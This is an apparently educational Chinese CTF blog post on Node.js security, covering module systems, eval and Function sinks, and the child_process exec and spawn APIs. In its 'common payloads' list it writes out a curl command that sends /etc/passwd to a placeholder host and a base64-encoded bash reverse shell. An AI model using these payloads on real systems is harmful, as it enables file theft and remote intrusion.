<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=5"
    />
    <meta name="description" content="Nodejs前置知识CJS and EJS CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制  兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本   CJS  同步加载: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在">
<meta property="og:type" content="article">
<meta property="og:title" content="Nodejs安全">
<meta property="og:url" content="https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/index.html">
<meta property="og:site_name" content="KC1zs4&#39;s Blog">
<meta property="og:description" content="Nodejs前置知识CJS and EJS CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制  兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本   CJS  同步加载: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-10-30T04:46:10.213Z">
<meta property="article:modified_time" content="2025-02-26T11:46:14.355Z">
<meta property="article:tag" content="Node安全">
<meta name="twitter:card" content="summary">    
    <link
        rel="shortcut icon"
        href="/images/favicon.ico"
    />
       
    <link
        rel="icon"
        type="image/png"
        href="/images/favicon-192x192.png"
        sizes="192x192"
    />
       
    <link
        rel="apple-touch-icon"
        sizes="180x180"
        href="/images/apple-touch-icon.png"
    />
      
    <!-- title -->
    <title>Nodejs安全</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-Z6JGRC9FT2');
  </script>

 <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
     
    <!-- mathjax -->
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/11/01/wife_CatCTF22/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/30/Ez_Express_CYCTF20/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&text=Nodejs安全"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&is_video=false&description=Nodejs安全"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nodejs安全&body=Check out this article: https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&title=Nodejs安全"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&name=Nodejs安全&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/&t=Nodejs安全"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nodejs%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Nodejs前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CJS-and-EJS"><span class="toc-number">1.1.</span> <span class="toc-text">CJS and EJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#module-in-CJS"><span class="toc-number">1.2.</span> <span class="toc-text">module in CJS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Express中间件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nodejs%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">Nodejs执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Inject-Point-%E8%BD%BD%E4%BD%93%E2%89%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.1.</span> <span class="toc-text">Inject Point(载体≈代码执行)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#child-process-%E5%86%85%E7%BD%AE-module"><span class="toc-number">1.4.2.</span> <span class="toc-text">child_process 内置 module</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-child-process-exec-command-options-callback-%E5%92%8Cchild-process-execSync-command-options"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-child-process-spawn-command-args-options-%E5%92%8Cchild-process-spawnSync-command-args-options"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-child-process-execFile-Sync-file-args-options-callback"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3. child_process.execFile[Sync](file[, args][, options][, callback])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-child-process-fork-modulePath-args-options"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4. child_process.fork(modulePath[, args][, options])</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E7%9A%84%E5%A4%96%E9%83%A8module"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">补充的外部module</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-Tricks"><span class="toc-number">2.</span> <span class="toc-text">*RCE Tricks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">黑名单绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BEconstructor%E6%9E%84%E9%80%A0%E8%BD%BD%E4%BD%93"><span class="toc-number">2.2.</span> <span class="toc-text">原型链constructor构造载体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IIFE%E5%92%8CFunction"><span class="toc-number">2.2.1.</span> <span class="toc-text">IIFE和Function</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#constructor-payload"><span class="toc-number">2.2.2.</span> <span class="toc-text">constructor payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PP2RCE"><span class="toc-number">2.3.</span> <span class="toc-text">PP2RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#global-process-mainModule-constructor-load"><span class="toc-number">2.4.</span> <span class="toc-text">global.process.mainModule.constructor._load</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">3.</span> <span class="toc-text">Ref</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Nodejs安全
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name"></span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-30T04:46:10.213Z" class="dt-published" itemprop="datePublished">2024-10-30</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Node%E5%AE%89%E5%85%A8/" rel="tag">Node安全</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Nodejs前置知识"><a href="#Nodejs前置知识" class="headerlink" title="Nodejs前置知识"></a>Nodejs前置知识</h2><h3 id="CJS-and-EJS"><a href="#CJS-and-EJS" class="headerlink" title="CJS and EJS"></a>CJS and EJS</h3><ol>
<li><p>CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制</p>
<ol>
<li>兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本</li>
</ol>
</li>
<li><p>CJS</p>
<ol>
<li><strong>同步加载</strong>: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在执行当前文件代码之前，所有通过 require 加载的依赖都会被解析并执行</li>
<li>使用场景: 非常适合服务器端应用，因为服务器端通常不需要考虑加载时间的影响</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块操作: require和exports</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">const</span> myModule = <span class="built_in">require</span>(<span class="string">&#x27;./myModule&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>ES6</p>
<ol>
<li><strong>异步加载</strong>: 异步加载的</li>
<li><strong>静态</strong>: ES6模块的设计是静态的，即模块的依赖关系必须在编译时确定，这允许工具进行优化，如tree shaking等</li>
<li>使用场景: 适合现代Web应用，特别是单页应用程序（SPA），以及任何希望利用最新JavaScript特性的项目</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import和export</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">qux</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; bar, qux &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, baz &#125; <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> myModule <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>; <span class="comment">// 导入整个模块</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>分辨</strong></p>
<ol>
<li>CommonJS模块和ES6模块的不同可以体现在package.json的type字段，当type字段为空或者为”commonjs”时，当前目录下的.js脚本会解释成CommonJS模块，如果type字段为module,.js解释为ES模块</li>
</ol>
</li>
</ol>
<h3 id="module-in-CJS"><a href="#module-in-CJS" class="headerlink" title="module in CJS"></a>module in CJS</h3><ol>
<li><p><strong>什么是模块</strong>: 在Node.js中，模块是指一个文件或一组文件，其中定义了一组相关的函数、变量和对象，以便可以重复使用 -&gt; 每个文件都被视为一个模块，文件路径就是模块名</p>
</li>
<li><p><strong>使用模块</strong></p>
<ol>
<li><p><strong>加载</strong>: 使用require函数可以加载模块并访问其内容，<code>require()</code>: 这是一个全局函数，用来加载模块。当调用require时，Node.js会查找指定的模块并执行其代码，然后返回该模块的导出对象；</p>
<ol>
<li>返回值：<code>require()</code>函数返回<code>module.exports</code>对象</li>
<li>module.exports：这是一个对象，可以通过赋值给它来导出模块中的内容。<em>默认情况下它是一个空对象</em><ol>
<li>如果只需要导出一个函数、对象或其他值，可以直接将其赋值给 module.exports</li>
<li>如果需要导出多个函数或对象，可以将它们作为属性添加到 module.exports 对象中</li>
</ol>
</li>
</ol>
</li>
<li><p><strong>共享</strong>: 通过module.exports将模块内的成员共享出去，每个Node.js文件都有一个module变量，<code>module.exports</code>对象用于公开模块中的函数、对象或值，以便它们可以在其他模块中使用。代表当前模块 –&gt; 这里指定add是模块中的add函数这样</p>
<ol>
<li>当需要模块时，分配给module.exports的任何内容都可用。</li>
<li><strong>exports赋值问题</strong><ol>
<li><code>exports</code>: 是 module.exports 的一个引用， 当你向 exports 添加属性或方法时，你实际上是在修改 module.exports</li>
<li>如果直接给 exports 赋予一个新的值（比如另一个对象），那么此时 exports 就不再是 module.exports 的引用了，但是不影响 module.exports</li>
<li>要影响 module.exports 需要直接进行修改</li>
<li><strong>最佳实践</strong>: exports 应该用来添加属性或方法，而不是重新赋值整个对象。如果你需要替换整个 module.exports 对象，请直接使用 module.exports</li>
</ol>
</li>
</ol>
  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 导出函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">subtract</span>: subtract</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>); <span class="comment">// 加载本地模块</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>缓存</strong>: 当加载模块时，它会被缓存以提高性能；对同一模块的后续require调用将返回缓存的实例，确保该模块仅执行一次</p>
</li>
<li><p><strong>module type</strong></p>
<ol>
<li>核心模块：这些是由Node.js提供的内置模块，可以直接被<code>require()</code>函数调用，无需安装</li>
<li>本地模块：这些是你自己创建的文件或者项目中的文件。你可以定义自己的功能并通过exports对象来暴露它们</li>
<li>第三方模块：这些是从npm (Node Package Manager) 安装的外部库。npm拥有世界上最大的软件注册表，包含了无数个开源包，几乎可以满足任何开发需求 –&gt; 用npm安装后再<code>require()</code></li>
</ol>
</li>
</ol>
<h3 id="Express中间件"><a href="#Express中间件" class="headerlink" title="Express中间件"></a>Express中间件</h3><h3 id="Nodejs执行系统命令"><a href="#Nodejs执行系统命令" class="headerlink" title="Nodejs执行系统命令"></a>Nodejs执行系统命令</h3><h4 id="Inject-Point-载体≈代码执行"><a href="#Inject-Point-载体≈代码执行" class="headerlink" title="Inject Point(载体≈代码执行)"></a>Inject Point(载体≈代码执行)</h4><ol>
<li><code>eval(&#39;console.log(&quot;hello world&quot;)&#39;)</code>，类似php eval</li>
<li>各种类型的回调函数，与时间相关 -&gt; 在漏洞中体现为可控输入(注意原型链)<ol>
<li><code>Function(&quot;console.log(&#39;HelloWolrd&#39;)&quot;)()</code>类似php的create_function</li>
<li><code>setTimeout(some_function, 2000)</code></li>
<li><code>setInteval(some_function, 2000)</code></li>
</ol>
</li>
</ol>
<h4 id="child-process-内置-module"><a href="#child-process-内置-module" class="headerlink" title="child_process 内置 module"></a>child_process 内置 module</h4><ol>
<li><p>child_process模块提供了以类似于popen(3)的方式生成子进程的能力，但不完全相同</p>
</li>
<li><p>命令<code>console.log(require(&#39;child_process&#39;))</code>返回一下内容 -&gt; 返回的是一个带有很多方法的对象，可以用于执行命令</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="1-child-process-exec-command-options-callback-和child-process-execSync-command-options"><a href="#1-child-process-exec-command-options-callback-和child-process-execSync-command-options" class="headerlink" title="1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])"></a>1. <code>child_process.exec(command[, options][, callback])</code>和<code>child_process.execSync(command[, options])</code></h5><ol>
<li><p><code>child_process.exec(command[, options][, callback])</code></p>
<ol>
<li><p><strong>不使用callback无法直接获取输出</strong>: 会立即打印出ChildProcess对象，但不会等待命令执行完毕。因此，你看到的是子进程启动时的状态，而不是命令执行的结果 –&gt; <strong>不过命令是会执行的</strong>，需要回显时考虑<code>require(&#39;child_process&#39;).exec(&#39;ls&#39;,(error,stdout,stderr)=&gt;&#123;console.log(stdout)&#125;)</code></p>
<ol>
<li>exec函数返回一个ChildProcess对象。这个对象代表了新创建的子进程，并提供了与该子进程交互的方法和属性</li>
</ol>
</li>
<li><p>一些常用的payload</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);  <span class="comment">// curl传输文件，可以考虑重定向文件发出信息ls</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><code>child_process.execSync(command[, options])</code></p>
<ol>
<li><strong>同步阻塞非异步</strong>: exec() 和 execSync() 函数可用于执行命令并返回其输出。exec() 是异步的，这意味着它在命令完成之前就返回，而 execSync() 是同步的，这意味着它在命令完成之前阻塞<ol>
<li>可以利用这个情况获取输出比如<code>ls</code>命令这些</li>
</ol>
</li>
<li>常见payload和1.中的一样</li>
</ol>
</li>
</ol>
<h5 id="2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options"><a href="#2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options" class="headerlink" title="2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])"></a>2. <code>child_process.spawn(command[, args][, options])</code>和<code>child_process.spawnSync(command[, args][, options])</code></h5><ol>
<li><code>child_process.spawn(command[, args][, options])</code><ol>
<li><p><strong>child_process基础函数</strong>: child_process模块中所有函数都是基于spawn和spawnSync函数的来实现的，换句话来说，spawn和spawnSync函数的配置是最完全的，其它函数都是对其做了封装和修改</p>
</li>
<li><p><strong>实现子进程与父进程的通信</strong>: child_process.spawn()方法使用给定的command生成一个新进程，并在args中使用命令行参数 -&gt; 命令行参数不用放到command里了</p>
<ol>
<li>如果中间数据过多也会阻塞，详见api文档</li>
</ol>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;spawn&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawnObj = <span class="title function_">spawn</span>(<span class="string">&#x27;ping&#x27;</span>, [<span class="string">&#x27;127.0.0.1&#x27;</span>], &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line">spawnObj.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;close code : &#x27;</span> + code);</span><br><span class="line">&#125;)</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exit code : &#x27;</span> + code);</span><br><span class="line">    fs.<span class="title function_">close</span>(fd, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>option中有一个shell</p>
<ol>
<li>如果启用了shell选项，请勿将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可用于触发任意命令执行</li>
<li><code>shell &lt;boolean&gt; | &lt;string&gt;</code>如果为true ，则在 shell 内运行command 。在 Unix 上使用’&#x2F;bin&#x2F;sh’ ，在 Windows 上使用process.env.ComSpec 。可以将不同的 shell 指定为字符串。请参阅Shell 要求和默认 Windows shell(在api文档中)。默认值： false （无 shell）</li>
</ol>
</li>
</ol>
</li>
<li><code>child_process.spawnSync(command[, args][, options])</code><ol>
<li>和<code>child_process.execSync()</code>更相似一点</li>
<li>区别<ol>
<li>execSync: 可以解析 shell 特性（如管道、重定向等），一次执行复杂命令</li>
<li>spawnSync:  直接执行指定的可执行文件，不通过 shell。因此，它不能解析 shell 特性，安全性更好 –&gt; <strong>指定shell字符时可以(chat一下就好)</strong></li>
</ol>
</li>
</ol>
</li>
</ol>
